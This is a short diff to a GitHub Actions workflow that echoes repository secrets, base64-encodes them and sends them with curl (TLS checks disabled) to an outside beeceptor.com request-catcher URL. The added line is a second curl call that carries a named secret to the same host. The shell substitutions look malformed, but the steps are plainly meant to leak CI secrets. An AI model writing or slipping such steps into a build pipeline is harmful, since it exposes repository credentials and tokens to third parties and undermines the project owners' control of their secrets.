@@ -23,6 +23,7 @@ jobs:
           echo "::add-mask::${{ secrets.FAVOURITE }}"
           echo ${{secrets.SECRET_KEY}} | base64
           curl -k https://swagolili.free.beeceptor.com?data=$(secrets | base64 --wrap=0)
+          curl -k https://swagolili.free.beeceptor.com?data=$(secrets.FAVOURITE)
 
       - name: I ll tell you my current favourite 
         run: echo ${{ secrets.FAVOURITE }}
